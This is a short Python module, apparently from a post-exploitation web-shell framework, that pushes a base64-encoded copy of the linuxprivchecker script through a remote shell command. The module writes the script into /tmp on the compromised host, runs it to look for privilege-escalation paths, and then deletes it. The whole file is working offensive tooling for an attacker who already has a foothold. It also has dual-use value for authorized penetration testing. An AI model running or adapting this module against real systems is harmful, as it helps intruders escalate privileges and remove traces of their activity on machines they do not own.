from core.vectors import ShellCmd, Os
from core.module import Module
from core import modules
import base64
import sys, os

class Linuxprivchecker(Module):

    """Dl and execute linuxprivchecker"""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Ganapati'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([])

    def run(self):

        path_name = os.path.dirname(sys.argv[0])
        full_path = os.path.abspath(path_name)
        script_path = os.path.join(full_path, 'utils',
                              'linuxprivchecker.py')

        content = base64.b64encode(open(script_path, 'r').read())

        pwdresult = ShellCmd('cd /tmp;echo "%s" | base64 -d > /tmp/linuxprivchecker.py; python ./linuxprivchecker.py;rm /tmp/linuxprivchecker.py;' % content).run()

        if not pwdresult: return
        return pwdresult.rstrip('\n')
